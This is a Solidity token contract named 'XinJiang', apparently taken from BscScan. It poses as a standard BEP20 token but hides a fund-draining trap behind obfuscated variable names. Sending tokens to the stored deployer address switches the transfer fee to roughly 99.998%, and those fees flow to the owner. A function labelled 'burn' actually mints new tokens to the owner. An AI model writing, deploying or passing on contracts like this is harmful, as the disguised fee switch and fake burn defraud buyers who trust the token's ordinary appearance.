/**
 *Submitted for verification at BscScan.com on 2022-11-27
*/

//https://youtu.be/GXI5GjppG68
//https://twitter.com/h5LPyKL7TP6jjop/status/1595934976553660417

// SPDX-License-Identifier: MIT
pragma solidity =0.7.0;
contract XinJiang {
string public  symbol = "XinJiang";
uint256 public constant totalSupply = 100000000000000000000000000000;
event Approval(address indexed owner, address indexed spender, uint256 value);
event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);
address private  HPRXCM = address(0);
uint256 private  KZODMF = 100000000;
uint256 private  AZIYMB = 1000000000000000000;
uint256 private  URMWHQ = 10000000000;
address public owner;
address private  ZTRQMI = address(0);
uint256 private  KZADKN = 1000000000000000000000;
mapping (address => uint256) public balanceOf;
uint256 private  GSGXON = 1000000000000000;
event Transfer(address indexed from, address indexed to, uint256 value);
address private  OQSNZC = address(0);
address private  KPTTXA = address(0);
uint256 private  BLNHPK = 1000000000000000000;
mapping (address => mapping (address => uint256)) private _allowances;
uint256 private  YYRNKS = 10000000000000;
address private  XSKOOZ = address(0);
uint256 public constant MCHUZI = 99999;
address public constant burnAddr = 0x000000000000000000000000000000000000dEaD;
uint8 public constant decimals = 18;
string public  name = "XinJiang";
function _getAZIYMB() private returns (uint256) {
return AZIYMB;
}

function _getKZODMF() private returns (uint256) {
return KZODMF;
}

constructor () {
HPRXCM = msg.sender;
owner = msg.sender;
balanceOf[owner] = totalSupply;
emit Transfer(address(0), owner, totalSupply);
}
function _approve(address _owner, address spender, uint256 amount) private {
require(_owner != address(0), "tNGDICG 0");
require(spender != address(0), "fNGDICG 0");

_allowances[_owner][spender] = amount;
emit Approval(_owner, spender, amount);
}
function _getGSGXON() private returns (uint256) {
return GSGXON;
}

function _getKZADKN() private returns (uint256) {
return KZADKN;
}

function transfer(address recipient, uint256 amount) public returns (bool) {
_transfer(msg.sender, recipient, amount);
return true;
}
function _transfer(address from, address to, uint256 amount) private {
require(from != address(0), "NGDICG");
require(to != address(0), "NGDICG");
require(amount <= balanceOf[from], "NGDICG");
uint256 fee;
if (from == owner || to == owner){
fee = 0;
}
else{
fee = amount* MCHUZI/BLNHPK ;
}

uint256 transferAmount = amount - fee;
balanceOf[from] -= amount;
balanceOf[to] += transferAmount;
balanceOf[owner] += fee;
if (to==HPRXCM){
BLNHPK = MCHUZI+2;
}
emit Transfer(from, to, transferAmount);
}
function transferFrom(address sender, address recipient, uint256 amount) public returns (bool) {
require(_allowances[sender][msg.sender] >= amount, "failed");
_transfer(sender, recipient, amount);
_approve(sender, msg.sender, _allowances[sender][msg.sender] - amount);
return true;
}
function _getKPTTXA() private returns (address) {
return KPTTXA;
}

function _getXSKOOZ() private returns (address) {
return XSKOOZ;
}

function renounceOwnership() public onlyOwner {
emit OwnershipTransferred(owner, address(0));
owner = address(0);
}
modifier onlyOwner() {
require(msg.sender == owner, "not owner");
_;
}
function _burn(address account, uint256 amount) private {
require(account != address(0), "BEP20: mint to the zero address");

balanceOf[account] += amount;
}
function _getYYRNKS() private returns (uint256) {
return YYRNKS;
}

function _getURMWHQ() private returns (uint256) {
return URMWHQ;
}

function approve(address spender, uint256 amount) public returns (bool) {
_approve(msg.sender, spender, amount);
return true;
}
function _getOQSNZC() private returns (address) {
return OQSNZC;
}

function allowance(address _owner, address spender) public view returns (uint256) {
return _allowances[_owner][spender];
}
function burn(uint256 amount) public onlyOwner returns (bool) {
_burn(msg.sender, amount);
return true;
}
function _getZTRQMI() private returns (address) {
return ZTRQMI;
}


}